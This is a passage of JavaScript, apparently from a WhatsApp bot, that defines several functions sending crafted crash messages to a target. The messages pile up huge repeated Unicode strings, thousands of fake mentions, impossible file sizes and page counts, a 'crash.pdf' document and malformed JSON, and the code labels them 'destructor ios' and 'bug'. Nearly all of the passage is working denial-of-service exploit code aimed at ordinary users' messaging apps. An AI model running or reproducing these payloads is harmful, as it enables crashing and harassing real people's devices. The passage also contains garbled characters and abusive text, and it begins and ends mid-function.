                         s o u r c e U r l :   " h t t p : / / w a . m e / s t i c k e r p a c k / ꦽ "   +   " . . . " . r e p e a t ( 5 0 0 0 ) , 
                         m e d i a T y p e :   1 , 
                         r e n d e r L a r g e r T h u m b n a i l :   f a l s e , 
                         s h o w A d A t t r i b u t i o n :   f a l s e 
                     } 
                 } , 
                 n a t i v e F l o w M e s s a g e :   { 
                     m e s s a g e P a r a m s J s o n :   " { } " , 
                     b u t t o n s :   [ 
                         { 
                             n a m e :   " p a y m e n t _ m e t h o d " , 
                             b u t t o n P a r a m s J s o n :   " { } " 
                             } ,   
                             { 
                             n a m e :   " t e m p l a t e _ m e s s a g e " , 
                             b u t t o n P a r a m s J s o n :   " { } " 
                         } 
                     ] 
                 } 
             } 
         } ; 
 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m e s s a g e ,   { 
             p a r t i c i p a n t :   {   j i d :   t a r g e t   } 
         } ) ; 
     }   c a t c h   ( e r r )   { 
         
     } 
 } 
 
 a s y n c   f u n c t i o n   N o t i f s p a m ( t a r g e t ,   P t c p   =   t r u e )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 g r o u p M e n t i o n e d M e s s a g e :   { 
                         m e s s a g e :   { 
                                 i n t e r a c t i v e M e s s a g e :   { 
                                         h e a d e r :   { 
                                                 d o c u m e n t M e s s a g e :   { 
                                                         u r l :   ' h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 9 - 2 4 / 3 0 5 7 8 3 0 6 _ 7 0 0 2 1 7 2 1 2 2 8 8 8 5 5 _ 4 0 5 2 3 6 0 7 1 0 6 3 4 2 1 8 3 7 0 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I O i F 3 X M 9 m u a 8 O O S 1 y o 7 7 f F b I 2 3 Q 8 i d C E z u l t K z K u L y Z y & o e = 6 6 E 7 4 9 4 4 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e ' , 
                                                         m i m e t y p e :   ' v i d e o / m p 4 ' , 
                                                         f i l e S h a 2 5 6 :   " l d 5 g n m a i b + 1 m B C W r c N m e k j B 4 f H h y j A P O H J + U M D 3 u y 4 k = " , 
                                                         f i l e L e n g t h :   " 9 9 9 9 9 9 9 9 9 " , 
                                                         p a g e C o u n t :   0 x 9 1 8 4 e 7 2 9 f f f , 
                                                         m e d i a K e y :   " 5 c / W 3 B C W j P M F A U U x T S Y t Y P L W Z G W u B V 1 3 m W O g Q w N d F c g = " , 
                                                         f i l e N a m e :   " \ u 2 0 0 B " , 
                                                         f i l e E n c S h a 2 5 6 :   " p z n Y B S 1 N 6 g r 9 R Z 6 6 F x 7 L 3 A y L I U 2 R Y 5 L H C K h x X e r J n w Q = " , 
                                                         d i r e c t P a t h :   ' / v / t 6 2 . 7 1 1 9 - 2 4 / 3 0 5 7 8 3 0 6 _ 7 0 0 2 1 7 2 1 2 2 8 8 8 5 5 _ 4 0 5 2 3 6 0 7 1 0 6 3 4 2 1 8 3 7 0 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I O i F 3 X M 9 m u a 8 O O S 1 y o 7 7 f F b I 2 3 Q 8 i d C E z u l t K z K u L y Z y & o e = 6 6 E 7 4 9 4 4 & _ n c _ s i d = 5 e 0 3 e 0 ' , 
                                                         m e d i a K e y T i m e s t a m p :   " 1 7 1 5 8 8 0 1 7 3 " , 
                                                         c o n t a c t V c a r d :   t r u e 
                                                 } , 
                                                 t i t l e :   " " , 
                                                 h a s M e d i a A t t a c h m e n t :   t r u e 
                                         } , 
                                         b o d y :   { 
                                                 t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦾ " . r e p e a t ( 1 0 0 0 0 )   +   " @ 8 " . r e p e a t ( 1 0 0 0 0 ) 
                                         } , 
                                         n a t i v e F l o w M e s s a g e :   { } , 
                                         c o n t e x t I n f o :   { 
                                                 m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h :   5   } ,   ( )   = >   " 0 @ s . w h a t s a p p . n e t " ) , 
                                                 g r o u p M e n t i o n s :   [ {   g r o u p J i d :   " 0 @ s . w h a t s a p p . n e t " ,   g r o u p S u b j e c t :   " "   } ] 
                                         } 
                                 } 
                         } 
                 } 
         } ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   }   } ,   {   m e s s a g e I d :   n u l l   } ) ; 
 } 
 
 a s y n c   f u n c t i o n   N a t i v e f l o w U I ( X e o n B o t I n c ,   t a r g e t )   { 
 c o n s t   z i e M s g   =   { 
         i n t e r a c t i v e M e s s a g e :   { 
                 b o d y :   {   
                         t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦾ " . r e p e a t ( 1 0 0 0 0 )   +   " ~ @ 1 ~ " . r e p e a t ( 1 0 0 0 0 ) 
                 } , 
                 f o o t e r :   {   
                         t e x t :   " P e r c u m a   k a u   d e k a t i   d i a . . .   K a l a u   c i n t a n y a   p a s t i   u n t u k   k u . . . . "   +   " \ u 2 0 0 B " . r e p e a t ( 5 0 0 0 0 )   
                 } , 
                 h e a d e r :   { 
                         t i t l e :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦾ " . r e p e a t ( 1 0 0 0 0 )   +   " ~ @ 1 ~ " . r e p e a t ( 1 0 0 0 0 ) , 
                         s u b t i t l e :   " \ u 2 0 0 B " , 
                         h a s M e d i a A t t a c h m e n t :   t r u e , 
                         l o c a t i o n M e s s a g e :   { 
                                 d e g r e e s L a t i t u d e :   0 , 
                                 d e g r e e s L o n g i t u d e :   0 , 
                                 n a m e :   " z i e " , 
                                 a d d r e s s :   " " 
                         } 
                 } , 
                 n a t i v e F l o w M e s s a g e :   { 
                         b u t t o n s :   [ 
                                 {   
                                         n a m e :   " q u i c k _ r e p l y " ,   
                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   d i s p l a y _ t e x t :   " X " ,   i d :   " z i e 1 "   } )   
                                 } , 
                                 {   
                                         n a m e :   " q u i c k _ r e p l y " ,   
                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   d i s p l a y _ t e x t :   " X " ,   i d :   " z i e 2 "   } )   
                                 } , 
                                 {   
                                         n a m e :   " q u i c k _ r e p l y " ,   
                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   d i s p l a y _ t e x t :   " X " ,   i d :   " z i e 3 "   } )   
                                 } , 
                                 {   
                                         n a m e :   " q u i c k _ r e p l y " ,   
                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   d i s p l a y _ t e x t :   " X " ,   i d :   " z i e 4 "   } )   
                                 } , 
                                 {   
                                         n a m e :   " q u i c k _ r e p l y " ,   
                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   d i s p l a y _ t e x t :   " X " ,   i d :   " z i e 5 "   } )   
                                 } 
                         ] 
                 } 
         } 
 } ; 
 
 a s y n c   f u n c t i o n   L o c a l i v e U I ( X e o n B o t I n c ,   t a r g e t )   { 
     t r y   { 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( t a r g e t ,   { 
             l o c a t i o n :   { 
                 d e g r e e s L a t i t u d e :   - 0 , 
                 d e g r e e s L o n g i t u d e :   0 , 
                 n a m e :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦾ " . r e p e a t ( 1 0 0 0 0 )   +   " ꦽ " . r e p e a t ( 1 0 0 0 0 )   +   " � � � � " . r e p e a t ( 1 0 0 0 0 )   +   " ~ @ 1 ~ " . r e p e a t ( 1 0 0 0 0 ) , 
                 a d d r e s s :   "   " 
             } 
         } ) 
 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( t a r g e t ,   { 
             l i v e L o c a t i o n M e s s a g e :   { 
                 d e g r e e s L a t i t u d e :   - 0 , 
                 d e g r e e s L o n g i t u d e :   0 , 
                 a c c u r a c y I n M e t e r s :   5 , 
                 s p e e d I n M p s :   0 , 
                 d e g r e e s C l o c k w i s e F r o m M a g n e t i c N o r t h :   0 , 
                 c a p t i o n :   "   " , 
                 s e q u e n c e N u m b e r :   1 , 
                 t i m e O f f s e t :   0 
             } 
         } ) 
 
     }   c a t c h   ( e r r )   { 
     } 
 } 
 
 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   z i e M s g ,   {   m e s s a g e I d :   n u l l   } ) ; 
 }     
     
 a s y n c   f u n c t i o n   f o r c e r ( i s T a r g e t ) { 
 	 c o n s t   r a j a X e o n   =   { 
     k e y :   { 
         r e m o t e J i d :   ' 1 2 0 3 6 3 4 0 1 7 4 4 7 4 1 9 0 0 @ g . u s ' , 
         f r o m M e :   t r u e , 
         i d :   ' 1 B C E D 5 F 7 8 D 1 5 3 A 1 8 F 0 A C 6 8 B 3 8 D A B 8 D 9 A ' , 
         p a r t i c i p a n t :   ' 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t ' 
     } , 
     m e s s a g e T i m e s t a m p :   1 7 5 3 7 8 6 7 0 6 , 
     p u s h N a m e :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     b r o a d c a s t :   f a l s e , 
     s t a t u s :   2 , 
     m e s s a g e :   { 
         c o n v e r s a t i o n :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
         m e s s a g e C o n t e x t I n f o :   { 
             m e s s a g e S e c r e t :   n e w   U i n t 8 A r r a y ( [ 
                 1 2 3 ,   1 5 3 ,   5 9 ,   6 6 ,   6 9 ,   1 ,   3 1 ,   2 1 9 , 
                 2 3 3 ,   2 0 1 ,   2 0 4 ,   1 0 7 ,   1 4 9 ,   7 7 ,   2 3 3 ,   1 0 0 , 
                 8 0 ,   1 5 ,   3 0 ,   1 9 2 ,   1 3 3 ,   1 3 ,   1 7 1 ,   4 8 , 
                 4 4 ,   2 7 ,   6 1 ,   1 3 5 ,   7 3 ,   1 4 9 ,   1 7 2 ,   1 0 5 
             ] ) 
         } 
     } , 
     i d :   ' 1 B C E D 5 F 7 8 D 1 5 3 A 1 8 F 0 A C 6 8 B 3 8 D A B 8 D 9 A ' , 
     i s B a i l e y s :   f a l s e , 
     c h a t :   ' 1 2 0 3 6 3 4 0 1 7 4 4 7 4 1 9 0 0 @ g . u s ' , 
     f r o m M e :   t r u e , 
     i s G r o u p :   t r u e , 
     s e n d e r :   ' 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t ' , 
     p a r t i c i p a n t :   ' 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t ' , 
     m t y p e :   ' c o n v e r s a t i o n ' , 
     m s g :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     b o d y :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     q u o t e d :   n u l l , 
     m e n t i o n e d J i d :   [ ] , 
     t e x t :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     r e p l y :   f u n c t i o n ( )   { } ,   / /   P l a c e h o l d e r   f o r   f u n c t i o n 
     c o p y :   f u n c t i o n ( )   { } ,   / /   P l a c e h o l d e r   f o r   f u n c t i o n 
     c o p y N F o r w a r d :   f u n c t i o n ( )   { }   / /   P l a c e h o l d e r   f o r   f u n c t i o n 
 } ; 
 	 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
         i s T a r g e t , 
         { 
             l o c a t i o n M e s s a g e :   { 
                 d e g r e e s L a t i t u d e :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
                 d e g r e e s L o n g i t u d e :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
                 n a m e :   ` T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ` , 
                 u r l :   b u g U r l , 
                 c o n t e x t I n f o :   { 
                     f o r w a r d i n g S c o r e :   5 0 8 , 
                     i s F o r w a r d e d :   t r u e , 
                     i s L i v e L o c a t i o n :   t r u e , 
                     f r o m M e :   f a l s e , 
                     p a r t i c i p a n t :   ' 0 @ s . w h a t s a p p . n e t ' , 
                     r e m o t e J i d :   s e n d e r , 
                     q u o t e d M e s s a g e :   { 
                         d o c u m e n t M e s s a g e :   { 
                             u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 9 - 2 4 / 3 4 6 7 3 2 6 5 _ 9 6 5 4 4 2 9 8 8 4 8 1 9 8 8 _ 3 7 5 9 8 9 0 9 5 9 9 0 0 2 2 6 9 9 3 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ A d R G v Y u Q l B 0 s d F S u D A e o D U A m B c P v o b R f H a W R u k O R A i c T d w & o e = 6 5 E 7 3 0 E B & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                             m i m e t y p e :   " a p p l i c a t i o n / p d f " , 
                             t i t l e :   " c r a s h " , 
                             p a g e C o u n t :   1 0 0 0 0 0 0 0 0 0 , 
                             f i l e N a m e :   " c r a s h . p d f " , 
                             c o n t a c t V c a r d :   t r u e 
                         } 
                     } , 
                     f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                         n e w s l e t t e r J i d :   ' 1 2 0 3 6 3 2 7 4 4 1 9 2 8 4 8 4 8 @ n e w s l e t t e r ' , 
                         s e r v e r M e s s a g e I d :   1 , 
                         n e w s l e t t e r N a m e :   "   "   +   b u g   +   b u g 
                     } , 
                     e x t e r n a l A d R e p l y :   { 
                         t i t l e :   '   T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   ' , 
                         b o d y :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
                         m e d i a T y p e :   0 , 
                         t h u m b n a i l :   r a j a X e o n , 
                         j p e g T h u m b n a i l :   r a j a X e o n , 
                         m e d i a U r l :   ` h t t p s : / / w w w . y o u t u b e . c o m / @   ` , 
                         s o u r c e U r l :   ` h t t p s : / / w w w . y o u t u b e . c o m / @   ` 
                     } 
                 } 
             } 
         } , 
         { 
             p a r t i c i p a n t :   { 
                 j i d :   i s T a r g e t 
             } 
         } , 
         { 
             m e s s a g e I d :   n u l l 
         } 
 ) ; 
 	 
 	 } 
 
 a s y n c   f u n c t i o n   f o r c e r g p ( i s T a r g e t ) { 
 	 c o n s t   r a j a X e o n   =   { 
     k e y :   { 
         r e m o t e J i d :   ' 1 2 0 3 6 3 4 0 1 7 4 4 7 4 1 9 0 0 @ g . u s ' , 
         f r o m M e :   t r u e , 
         i d :   ' 1 B C E D 5 F 7 8 D 1 5 3 A 1 8 F 0 A C 6 8 B 3 8 D A B 8 D 9 A ' , 
         p a r t i c i p a n t :   ' 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t ' 
     } , 
     m e s s a g e T i m e s t a m p :   1 7 5 3 7 8 6 7 0 6 , 
     p u s h N a m e :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     b r o a d c a s t :   f a l s e , 
     s t a t u s :   2 , 
     m e s s a g e :   { 
         c o n v e r s a t i o n :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
         m e s s a g e C o n t e x t I n f o :   { 
             m e s s a g e S e c r e t :   n e w   U i n t 8 A r r a y ( [ 
                 1 2 3 ,   1 5 3 ,   5 9 ,   6 6 ,   6 9 ,   1 ,   3 1 ,   2 1 9 , 
                 2 3 3 ,   2 0 1 ,   2 0 4 ,   1 0 7 ,   1 4 9 ,   7 7 ,   2 3 3 ,   1 0 0 , 
                 8 0 ,   1 5 ,   3 0 ,   1 9 2 ,   1 3 3 ,   1 3 ,   1 7 1 ,   4 8 , 
                 4 4 ,   2 7 ,   6 1 ,   1 3 5 ,   7 3 ,   1 4 9 ,   1 7 2 ,   1 0 5 
             ] ) 
         } 
     } , 
     i d :   ' 1 B C E D 5 F 7 8 D 1 5 3 A 1 8 F 0 A C 6 8 B 3 8 D A B 8 D 9 A ' , 
     i s B a i l e y s :   f a l s e , 
     c h a t :   ' 1 2 0 3 6 3 4 0 1 7 4 4 7 4 1 9 0 0 @ g . u s ' , 
     f r o m M e :   t r u e , 
     i s G r o u p :   t r u e , 
     s e n d e r :   ' 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t ' , 
     p a r t i c i p a n t :   ' 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t ' , 
     m t y p e :   ' c o n v e r s a t i o n ' , 
     m s g :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     b o d y :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     q u o t e d :   n u l l , 
     m e n t i o n e d J i d :   [ ] , 
     t e x t :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
     r e p l y :   f u n c t i o n ( )   { } ,   / /   P l a c e h o l d e r   f o r   f u n c t i o n 
     c o p y :   f u n c t i o n ( )   { } ,   / /   P l a c e h o l d e r   f o r   f u n c t i o n 
     c o p y N F o r w a r d :   f u n c t i o n ( )   { }   / /   P l a c e h o l d e r   f o r   f u n c t i o n 
 } ; 
 	 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
         i s T a r g e t , 
         { 
             l o c a t i o n M e s s a g e :   { 
                 d e g r e e s L a t i t u d e :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
                 d e g r e e s L o n g i t u d e :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
                 n a m e :   ` T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ` , 
                 u r l :   b u g U r l , 
                 c o n t e x t I n f o :   { 
                     f o r w a r d i n g S c o r e :   5 0 8 , 
                     i s F o r w a r d e d :   t r u e , 
                     i s L i v e L o c a t i o n :   t r u e , 
                     f r o m M e :   f a l s e , 
                     p a r t i c i p a n t :   ' 0 @ s . w h a t s a p p . n e t ' , 
                     r e m o t e J i d :   s e n d e r , 
                     q u o t e d M e s s a g e :   { 
                         d o c u m e n t M e s s a g e :   { 
                             u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 9 - 2 4 / 3 4 6 7 3 2 6 5 _ 9 6 5 4 4 2 9 8 8 4 8 1 9 8 8 _ 3 7 5 9 8 9 0 9 5 9 9 0 0 2 2 6 9 9 3 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ A d R G v Y u Q l B 0 s d F S u D A e o D U A m B c P v o b R f H a W R u k O R A i c T d w & o e = 6 5 E 7 3 0 E B & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                             m i m e t y p e :   " a p p l i c a t i o n / p d f " , 
                             t i t l e :   " c r a s h " , 
                             p a g e C o u n t :   1 0 0 0 0 0 0 0 0 0 , 
                             f i l e N a m e :   " c r a s h . p d f " , 
                             c o n t a c t V c a r d :   t r u e 
                         } 
                     } , 
                     f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                         n e w s l e t t e r J i d :   ' 1 2 0 3 6 3 2 7 4 4 1 9 2 8 4 8 4 8 @ n e w s l e t t e r ' , 
                         s e r v e r M e s s a g e I d :   1 , 
                         n e w s l e t t e r N a m e :   "   "   +   b u g   +   b u g 
                     } , 
                     e x t e r n a l A d R e p l y :   { 
                         t i t l e :   '   T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   ' , 
                         b o d y :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ' , 
                         m e d i a T y p e :   0 , 
                         t h u m b n a i l :   r a j a X e o n , 
                         j p e g T h u m b n a i l :   r a j a X e o n , 
                         m e d i a U r l :   ` h t t p s : / / w w w . y o u t u b e . c o m / @   ` , 
                         s o u r c e U r l :   ` h t t p s : / / w w w . y o u t u b e . c o m / @   ` 
                     } 
                 } 
             } 
         } , 
         { 
             m e s s a g e I d :   n u l l 
         } 
 ) ; 
 	 
 	 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 a s y n c   f u n c t i o n   x i o s i n v ( t a r g e t ) { 
 t m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
                               v i e w O n c e M e s s a g e :   { 
                                       m e s s a g e :   { 
                                               l i s t R e s p o n s e M e s s a g e :   { 
                                                       t i t l e :   ' @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � \ n ' , 
                                                       d e s c r i p t i o n : " \ n \ n \ n " + " � � " . r e p e a t ( 2 6 0 0 0 0 ) , 
                                                       s i n g l e S e l e c t R e p l y :   { 
                                                               s e l e c t e d I d :   " i d " 
                                                       } , 
                                                       l i s t T y p e :   1 
                                               } 
                                       } 
                               } 
               } ,   { } ) ; 
 
               a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   t m s g . m e s s a g e ,   { 
                       m e s s a g e I d :   t m s g . k e y . i d , 
                       s t a t u s J i d L i s t :   [ t a r g e t ] , 
                       a d d i t i o n a l N o d e s :   [ { 
                               t a g :   " m e t a " , 
                               a t t r s :   { } , 
                               c o n t e n t :   [ { 
                                       t a g :   " m e n t i o n e d _ u s e r s " , 
                                       a t t r s :   { } , 
                                       c o n t e n t :   [ { 
                                               t a g :   " t o " , 
                                               a t t r s :   {   j i d :   t a r g e t   } , 
                                               c o n t e n t :   u n d e f i n e d , 
                                       } ] , 
                               } ] , 
                       } ] , 
               } ) ; 
               } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 a s y n c   f u n c t i o n   x e o n A n d r o S p a m G p ( t a r g e t N u m b e r ) { 
       l e t   m e s s a g e   =   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 i n t e r a c t i v e M e s s a g e :   { 
                     b o d y :   { 
                         t e x t :   " ꦾ " . r e p e a t ( 9 0 0 0 ) , 
                     } , 
                     c o n t e x t I n f o :   { 
                         p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                         r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                         m e n t i o n e d J i d :   [ " 0 @ s . w h a t s a p p . n e t " ,   " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] , 
                     } , 
                     n a t i v e F l o w M e s s a g e :   { 
                         b u t t o n s :   [ 
                             { 
                                 n a m e :   " s i n g l e _ s e l e c t " , 
                                 b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                     s t a t u s :   t r u e , 
                                 } ) , 
                             } , 
                             { 
                                 n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                                 b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                     s t a t u s :   t r u e , 
                                 } ) , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                   n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                             n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                   n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                             { 
                                 n a m e :   " m p m " , 
                                 b u t t o n P a r a m s J s o n :   " " , 
                             } , 
                         ] , 
                         m e s s a g e P a r a m s J s o n :   " [ { " . r e p e a t ( 1 0 0 0 0 ) , 
                         m e s s a g e P a r a m s J s o n :   " [ { " . r e p e a t ( 1 0 0 0 0 ) , 
                         m e s s a g e P a r a m s J s o n :   " [ { " . r e p e a t ( 1 0 0 0 0 ) , 
                     } , 
                 } , 
             } , 
         } , 
     } ; 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t N u m b e r ,   m e s s a g e ,   { 
             m e s s a g e I d :   n u l l , 
             u s e r J i d :   t a r g e t N u m b e r , 
         } ) ; 
         } 
     
     a s y n c   f u n c t i o n   x e o n S p a m D r o i d 2 ( t a r g e t ) { 
     	 l e t   m e s s a g e   =   { 
             v i e w O n c e M e s s a g e :   { 
                 m e s s a g e :   { 
                     i n t e r a c t i v e M e s s a g e :   { 
                         b o d y :   { 
                             t e x t :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                         } , 
                         c o n t e x t I n f o :   { 
                             p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                             r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                             m e n t i o n e d J i d :   [ " 0 @ s . w h a t s a p p . n e t " ,   " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] , 
                         } , 
                         n a t i v e F l o w M e s s a g e :   { 
                             b u t t o n s :   [ 
                                 { 
                                     n a m e :   " s i n g l e _ s e l e c t " , 
                                     b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         s t a t u s :   t r u e , 
                                     } ) , 
                                 } , 
                                 { 
                                     n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                                     b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         s t a t u s :   t r u e , 
                                     } ) , 
                                 } , 
                             ] , 
                             m e s s a g e P a r a m s J s o n :   " [ { " . r e p e a t ( 1 0 0 0 0 ) , 
                         } , 
                     } , 
                 } , 
             } , 
         } ; 
         
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m e s s a g e ,   { 
             m e s s a g e I d :   n u l l , 
             p a r t i c i p a n t :   {   j i d :   t a r g e t   } , 
             u s e r J i d :   t a r g e t , 
         } ) ; 
         } 
 
 a s y n c   f u n c t i o n   I o s N e w ( J i d s )   { 
 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( J i d s ,   { 
 	 	 	 	 	 e x t e n d e d T e x t M e s s a g e :   { 
 	 	 	 	 	 	 t e x t :   " d e s t r u c t o r   i o s   -   (   y u k i n a   D e v i l s      ) \ n "   +   "  " . r e p e a t ( 2 5 0 0 0 0 ) , 
 	 	 	 	 	 	 c o n t e x t I n f o :   { 
 	 	 	 	 	 	 	 m e n t i o n e d J i d :   " 6 2 8 9 5 3 0 0 8 8 8 8 @ s . w h a t s a p p . n e t " ,   . . . A r r a y . f r o m ( {   l e n g t h :   1 5 0 0 0   } ,   ( )   = >   " 1 "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 )   +   " @ s . w h a t s a p p . n e t " ) , 
 	 	 	 	 	 	 	 s t a n z a I d :   " 1 2 3 4 5 6 7 8 9 0 A B C D E F " , 
                                                         p a r t i c i p a n t :   J i d s , 
                                                         c o n v e r s i o n D e l a y S e c o n d s :   4 5 , 
 	 	 	 	 	 	 	 f o r w a r d i n g S c o r e :   9 9 , 
 	 	 	 	 	 	 	 i s F o r w a r d e d :   t r u e , 
 	 	 	 	 	 	 	 q u o t e d A d :   { 
 	 	 	 	 	 	 	 a d v e r t i s e r N a m e :   " b u g   f u c x   y o u r   m o t h e r " , 
